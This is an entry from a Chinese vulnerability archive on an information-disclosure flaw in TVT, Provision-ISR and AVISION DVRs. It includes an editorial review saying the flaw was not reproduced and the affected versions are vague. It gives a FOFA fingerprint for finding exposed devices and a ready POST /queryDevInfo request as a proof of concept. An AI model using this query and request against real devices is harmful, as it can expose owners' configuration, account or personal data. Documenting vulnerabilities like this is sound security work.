---
source: "wy876 漏洞文库"
id: "vw-9e06621a257362c2216ca5d9"
entity_id: "ve-9e06621a257362c2216ca5d9"
schema_version: "1"
title: "DVR设备存在敏感信息泄露"
product: "TVT/Provision-ISR/AVISION相关DVR，OEM关系待证"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "型号/固件及鉴权不详"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/%E5%85%B6%E4%BB%96%E8%AE%BE%E5%A4%87/DVR%E8%AE%BE%E5%A4%87%E5%AD%98%E5%9C%A8%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/og9o95nb4rdos806"
source_status: "recorded"
previous_fofa_unverified: "icon_hash="
fofa: "icon_hash=\"492290497\""
---

# DVR设备存在敏感信息泄露

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：TVT/Provision-ISR/AVISION相关DVR，OEM关系待证
- 本文讨论：queryDevInfo设备信息泄露
- 版本、权限与配置前提：型号/固件及鉴权不详
- 资料类型：信息泄露请求摘录；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 影响版本仅写DVR，跨品牌范围无型号矩阵
- 没有响应，不能区分正常公开设备元信息与敏感数据
- Accept-Encoding头多引号，XML请求未标Content-Type；frontmatter icon_hash残缺
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 各品牌固件映射与泄露敏感性待证
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
DVR（数字视频录像机）设备中，包括 TVT、Provision-ISR、AVISION 等品牌的机型。DVR设备存在敏感信息泄露

# 二、影响版本
+ DVR

# 三、资产测绘
+ fofa`icon_hash="492290497"`
+ 特征


# 四 、漏洞复现
```http
POST /queryDevInfo HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept-Language: en-US,en;q=0.9
Accept-Encoding": gzip, deflate
Accept: */*
Connection: keep-alive

<?xml version="1.0" encoding="utf-8" ?><request version="1.0" systemType="NVMS-9000" clientType="WEB"/>
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/og9o95nb4rdos806>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
